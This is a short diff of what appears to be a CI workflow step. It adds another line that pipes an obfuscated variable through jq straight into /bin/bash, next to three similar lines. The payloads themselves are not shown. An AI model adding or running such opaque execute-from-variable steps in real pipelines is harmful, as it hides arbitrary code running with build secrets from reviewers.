@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$dpbgn054" | jq -r .ngee8678 | /bin/bash
           echo $u7574 | jq -r .sx7277 | /bin/bash
           echo $w332 | jq -r .ysu1612 | /bin/bash
+          echo $xlg5 | jq -r .fhxd771 | /bin/bash
 
       - name: Store artifact
         if: always()
